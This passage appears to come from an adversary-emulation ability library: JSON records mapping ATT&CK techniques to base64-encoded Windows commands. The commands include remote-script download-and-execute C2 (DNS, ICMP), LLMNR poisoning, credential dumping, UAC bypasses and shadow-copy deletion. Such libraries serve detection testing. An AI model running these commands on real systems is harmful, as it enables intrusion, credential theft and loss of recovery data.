"ability_id": "bd5ee87126c38b409c12f823ec4469c2", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Opening ports for proxy - HARDRAIN", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iYXRvbWljIHRlc3RpbmciIHByb3RvY29sPVRDUCBsb2NhbHBvcnQ9NDUwID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n", "variations": []}, {"test": "SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViY2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1a2ViYWdnZXR0L2Ruc2NhdDItcG93ZXJzaGVsbC80NTgzNjgxOWIyMzM5ZjBiYjY0ZWFmMjk0ZjhjYzc4MzYzNWUwMGM2L2Ruc2NhdDIucHMxJyk7IFN0YXJ0LURuc2NhdDIgLURvbWFpbiAje2RvbWFpbn0gLUROU1NlcnZlciAje3NlcnZlcl9pcH0=", "ability_id": "c771bc0a37e6b332cd1dac6a410144eb", "technique_name": "Application Layer Protocol: DNS", "additional_info": {}, "privilege": "", "technique_id": "T1071.004", "platform": "windows", "name": "DNS C2", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LZXZpbi1Sb2JlcnRzb24vSW52ZWlnaC84MmJlMjM3N2FkZTQ3YTRlMzI1MjE3YjQxNDQ4NzhhNTk1OTVlNzUwL0ludmVpZ2gucHMxIiAtVXNlQmFzaWNQYXJzaW5nKTsgSW52b2tlLUludmVpZ2ggLUNvbnNvbGVPdXRwdXQgWSAtTkJOUyBZIC1NRE5TIFkgLUhUVFBTIFkgLVBST1hZIFk=", "ability_id": "5ee8fce78c4cef28c4e6ecebe77bdba4", "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay", "additional_info": {}, "privilege": "", "technique_id": "T1557.001", "platform": "windows", "name": "LLMNR Poisoning with Inveigh (PowerShell)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.", "variations": []}, {"test": "SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZHN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvYzc1ZGE3ZjkxZmNjMzU2Zjg0NmUwOWVhYjBjZmQ3ZjI5NmViZjc0Ni9TaGVsbHMvSW52b2tlLVBvd2VyU2hlbGxJY21wLnBzMScpOyBJbnZva2UtUG93ZXJTaGVsbEljbXAgLUlQQWRkcmVzcyAje3NlcnZlcl9pcH0=", "ability_id": "f58d6c18ad6a30a73499c4b256b846ff", "technique_name": "Non-Application Layer Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1095", "platform": "windows", "name": "ICMP C2", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n", "variations": []}, {"test": "bmV0IGdyb3VwICJEb21haW4gQ29tcHV0ZXJzIiAvZG9tYWlu", "ability_id": "d8fedd81fc35099a5a3f1a8f5d2082dd", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - net group Domain Computers", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvRmlsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclxUMTA1OS4wMDVcc3JjXFQxMDU5LjAwNS1tYWNyb2NvZGUudHh0IiAtb2ZmaWNlUHJvZHVjdCAiV29yZCIgLXN1YiAiRXhlYyI=", "ability_id": "9c955a373154a7090d4b4396b561f5da", "technique_name": "Command and Scripting Interpreter: Visual Basic", "additional_info": {}, "privilege": "", "technique_id": "T1059.005", "platform": "windows", "name": "Encoded VBS code execution", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["R2V0LVdtaU9iamVjdCB3aW4zMl9wcm9jZXNzIHwgV2hlcmUtT2JqZWN0IHskXy5Db21tYW5kTGluZSAtbGlrZSAiKm1zaHRhKiJ9ICB8ICUgeyAiJChTdG9wLVByb2Nlc3MgJF8uUHJvY2Vzc0lEKSIgfSB8IE91dC1OdWxs"], "executor": "psh", "access": {}, "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi9sb2dmaWxlPSAvbG9ndG9jb25zb2xlPWZhbHNlIC9VIGAiJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGhgIiI7ICRFeHBlY3RlZE91dHB1dCA9ICdDb25zdHJ1Y3Rvcl9Vbmluc3RhbGxfJzsgOyAkVGVzdEFyZ3MgPSBAezsgICAgIE91dHB1dEFzc2VtYmx5RGlyZWN0b3J5ID0gJEluc3RhbGxlckFzc2VtYmx5RGlyOyAgICAgT3V0cHV0QXNzZW1ibHlGaWxlTmFtZSA9ICRJbnN0YWxsZXJBc3NlbWJseUZpbGVOYW1lOyAgICAgSW52b2NhdGlvbk1ldGhvZCA9ICdFeGVjdXRhYmxlJzsgICAgIENvbW1hbmRMaW5lID0gJENvbW1hbmRMaW5lOyB9OyA7ICRBY3R1YWxPdXRwdXQgPSBJbnZva2UtQnVpbGRBbmRJbnZva2VJbnN0YWxsVXRpbEFzc2VtYmx5IEBUZXN0QXJnczsgOyBpZiAoJEFjdHVhbE91dHB1dCAtbmUgJEV4cGVjdGVkT3V0cHV0KSB7OyAgICAgdGhyb3cgQCI7IEluc3RhbGxVdGlsIFVuaW5zdGFsbCBtZXRob2QgZXhlY3V0aW9uIHRlc3QgZmFpbHVyZS4gSW5zdGFsbGVyIGFzc2VtYmx5IGV4ZWN1dGlvbiBvdXRwdXQgZGlkIG5vdCBtYXRjaCB0aGUgZXhwZWN0ZWQgb3V0cHV0LjsgRXhwZWN0ZWQ6ICRFeHBlY3RlZE91dHB1dDsgQWN0dWFsOiAkQWN0dWFsT3V0cHV0OyAiQDsgfQ==", "ability_id": "31becca824673e30a599c912d40f0734", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil Uninstall method call - /U variant", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "variations": []}, {"test": "U3RhcnQtQVRIUHJvY2Vzc1VuZGVyU3BlY2lmaWNQYXJlbnQgLUZpbGVQYXRoICRFbnY6d2luZGlyXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLUNvbW1hbmRMaW5lICctQ29tbWFuZCBTdGFydC1TbGVlcCAxMCcgLVBhcmVudElkICRQSUQ=", "ability_id": "b9bb53ad6a16282b6f77056204e8d98a", "technique_name": "Access Token Manipulation: Parent PID Spoofing", "additional_info": {}, "privilege": "", "technique_id": "T1134.004", "platform": "windows", "name": "Parent PID Spoofing - Spawn from Current Process", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Spawns a powershell.exe process as a child of the current process.", "variations": []}, {"test": "Y21kIC9jICJmb3IgL2wgJXggaW4gKDEsMSw3NSkgZG8gc3RhcnQgd29yZHBhZC5leGUgL3AgJGVudjp0ZW1wXFQxMDU5XzAwM25vdGUudHh0IiB8IG91dC1udWxs", "ability_id": "645a5637236ed7052aa5fe68d7b5a65b", "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "additional_info": {}, "privilege": "", "technique_id": "T1059.003", "platform": "windows", "name": "Simulate BlackByte Ransomware Print Bombing", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c3RvcC1wcm9jZXNzIC1uYW1lIHdvcmRwYWQgLWZvcmNlIC1lcnJvcmFjdGlvbiBzaWxlbnRseWNvbnRpbnVl"], "executor": "psh", "access": {}, "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n", "variations": []}, {"test": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9OyR3ZWIgPSAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCk7JHJlc3VsdCA9ICR3ZWIuRG93bmxvYWRGaWxlKCJodHRwczovL2Rvd25sb2FkLnN5c2ludGVybmFscy5jb20vZmlsZXMvUFNUb29scy56aXAiLCAiUFNUb29scy56aXAiKTtOZXctSXRlbSAtSXRlbVR5cGUgImRpcmVjdG9yeSIgQzpcV2luZG93c1xTeXN0ZW0zMlxQU1Rvb2xzIC1Gb3JjZTtBZGQtVHlwZSAtQXNzZW1ibHkgJ1N5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtJzsgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5aaXBGaWxlXTo6RXh0cmFjdFRvRGlyZWN0b3J5KCJQU1Rvb2xzLnppcCIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXFBTVG9vbHMiKTs=", "ability_id": "eb814e03-811a-467a-bc6d-dcd453750fa2", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Install PSTools", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Download and install PSTools by unzipping the file", "variations": []}, {"test": "bmV0IGdyb3VwIC9kb21haSAiRG9tYWluIEFkbWlucyIgJiYgbmV0IGdyb3VwcyAiQWNjb3VudCBPcGVyYXRvcnMiIC9kb21hICYmIG5ldCBncm91cHMgIkV4Y2hhbmdlIE9yZ2FuaXphdGlvbiBNYW5hZ2VtZW50IiAvZG9tYSAmJiBuZXQgZ3JvdXAgIkJVSUxUSU5cQmFja3VwIE9wZXJhdG9ycyIgL2RvbWE=", "ability_id": "548dc737f7e316338a51a0860bd9a89a", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Elevated group enumeration using net group (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIHN5c3NldHVwLmRsbCxTZXR1cEluZk9iamVjdEluc3RhbGxBY3Rpb24gRGVmYXVsdEluc3RhbGwgMTI4IC5cNGM4NzBkX1QxMjE4LjAxMV9EZWZhdWx0SW5zdGFsbC5pbmY=", "ability_id": "3c15abdc43fef1e4a05ef25fb29f928c", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 syssetup.dll Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["4c870d_T1218.011_DefaultInstall.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n", "variations": []}, {"test": "SUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9za2FyNDQ0NC9XaW5kb3dzLUNyZWRlbnRpYWwtTWFuYWdlci80YWQyMDhlNzBjODBkZDJhOTk2MWRiNDA3OTNkYTI5MWIxOTgxZTAxL0dldENyZWRtYW5DcmVkcy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtQ3JlZE1hbkNyZWRzIC1Gb3JjZQ==", "ability_id": "9d0478981edda6091f911a1305025bde", "technique_name": "Credentials from Password Stores", "additional_info": {}, "privilege": "", "technique_id": "T1555", "platform": "windows", "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module will extract the credentials from Windows Credential Manager", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFRlYW1WaWV3ZXJfNTQubG9n", "ability_id": "e094df8e82d3301ca9a97a7188e37e45", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete TeamViewer Log Files", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n", "variations": []}, {"test": "R2V0LU5ldFRDUENvbm5lY3Rpb24=", "ability_id": "8ed60dceb98746f1da6214f4f6af7164", "technique_name": "System Network Connections Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1049", "platform": "windows", "name": "System Network Connections Discovery with PowerShell", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n", "variations": []}, {"test": "W2FjdGl2YXRvcl06OkNyZWF0ZUluc3RhbmNlKFt0eXBlXTo6R2V0VHlwZUZyb21Qcm9nSUQoIk1NQzIwLmFwcGxpY2F0aW9uIiwibG9jYWxob3N0IikpLkRvY3VtZW50LkFjdGl2ZVZpZXcuRXhlY3V0ZVNoZWxsQ29tbWFuZCgiYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZSIsICRudWxsLCAkbnVsbCwgIjciKQ==", "ability_id": "d39f399d75f3dcb5ab753f70f47449b0", "technique_name": "Remote Services: Distributed Component Object Model", "additional_info": {}, "privilege": "", "technique_id": "T1021.003", "platform": "windows", "name": "PowerShell Lateral Movement using MMC20", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n", "variations": []}, {"test": "d21pYyAvbm9kZToxMjcuMC4wLjEgcHJvY2VzcyBjYWxsIGNyZWF0ZSAicnVuZGxsMzIuZXhlICRlbnY6VEVNUFxjYWxjLmRsbCBTdGFydFci", "ability_id": "f4b0b4129560ea66f9751275e82f6bab", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Execute rundll32", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dGFza2tpbGwgL2YgL2ltIGNhbGN1bGF0b3IuZXhl"], "executor": "psh", "access": {}, "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n", "variations": []}, {"test": "cmVnIHF1ZXJ5IEhLTE0gL2YgcGFzc3dvcmQgL3QgUkVHX1NaIC9zICYmIHJlZyBxdWVyeSBIS0NVIC9mIHBhc3N3b3JkIC90IFJFR19TWiAvcw==", "ability_id": "3e5b04b8ee0a1a4950da8f35d95e65fc", "technique_name": "Unsecured Credentials: Credentials in Registry", "additional_info": {}, "privilege": "", "technique_id": "T1552.002", "platform": "windows", "name": "Enumeration for Credentials in Registry", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n", "variations": []}, {"test": "dnNzYWRtaW4uZXhlIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0", "ability_id": "153905affadb36241ced3d3b12ba0481", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Delete Volume Shadow Copies", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVwzOSBBa2FnaTY0LmV4ZSI=", "ability_id": "702e25bac965a0efbe89a73ef3f62166", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 39", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "Yml0c2FkbWluLmV4ZSAvdHJhbnNmZXIgL0Rvd25sb2FkIC9wcmlvcml0eSBGb3JlZ3JvdW5kIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDExOTcvVDExOTcubWQgJXRlbXAlXGJpdHNhZG1pbjFfZmxhZy5wczE=", "ability_id": "1afbdfbde69a1d79059b0df714b219d9", "technique_name": "BITS Jobs", "additional_info": {}, "privilege": "", "technique_id": "T1197", "platform": "windows", "name": "Bitsadmin Download (cmd)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxiaXRzYWRtaW4xX2ZsYWcucHMxID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n", "variations": []}, {"test": "I3ttd2NwYXRofVwje213Y25hbWV9ICIje3htbF9wYXlsb2FkfSIgb3V0cHV0LnR4dA==", "ability_id": "fa95e200333f1d07730cd89ef0845643", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "Microsoft.Workflow.Compiler.exe Payload Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "variations": []}, {"test": "ZGlyIC9zIGM6XCA+PiAldGVtcCVcZG93bmxvYWQgJiYgZGlyIC9zICJjOlxEb2N1bWVudHMgYW5kIFNldHRpbmdzIiA+PiAldGVtcCVcZG93bmxvYWQgJiYgZGlyIC9zICJjOlxQcm9ncmFtIEZpbGVzXCIgPj4gJXRlbXAlXGRvd25sb2FkICYmIGRpciAiJXN5c3RlbWRyaXZlJVxVc2Vyc1wqLioiID4+ICV0ZW1wJVxkb3dubG9hZCAmJiBkaXIgIiV1c2VycHJvZmlsZSVcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudFwqLioiID4+ICV0ZW1wJVxkb3dubG9hZCAmJiBkaXIgIiV1c2VycHJvZmlsZSVcRGVza3RvcFwqLioiID4+ICV0ZW1wJVxkb3dubG9hZCAmJiB0cmVlIC9GID4+ICV0ZW1wJVxkb3dubG9hZA==", "ability_id": "26c90305a0d2404c93ac1d25df3dde7e", "technique_name": "File and Directory Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1083", "platform": "windows", "name": "File and Directory Discovery (cmd.exe)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Find or discover files on the file system.  Upon execution, the file \"download\" will be placed in the temporary folder and contain the output of\nall of the data discovery commands.\n", "variations": []}, {"test": "TmV3LUl0ZW0gLUZvcmNlIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXEZvbGRlclxzaGVsbFxvcGVuXGNvbW1hbmQiIC1WYWx1ZSAnY21kLmV4ZSAvYyBub3RlcGFkLmV4ZSc7IE5ldy1JdGVtUHJvcGVydHkgLUZvcmNlIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXEZvbGRlclxzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZW52OndpbmRpclxzeXN0ZW0zMlxzZGNsdC5leGU7IFN0YXJ0LVNsZWVwIC1zIDM=", "ability_id": "7c8a19a8922ee0d61a9f27ffa8347de2", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using sdclt DelegateExecute", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcRm9sZGVyIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XGNzYy5leGUgLW91dDolVEVNUCVcVDEwMTAuZXhlIDFiNDQwOV9UMTAxMC5jcyAmJiAlVEVNUCVcVDEwMTAuZXhl", "ability_id": "a3e8892b98d8fb77faca916f64439b69", "technique_name": "Application Window Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1010", "platform": "windows", "name": "List Process Main Windows - C# .NET", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["1b4409_T1010.cs"], "cleanup": ["ZGVsIC9mIC9xIC9zICVURU1QJVxUMTAxMC5leGUgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n", "variations": []}, {"test": "Z3ByZXN1bHQgL1I=", "ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, 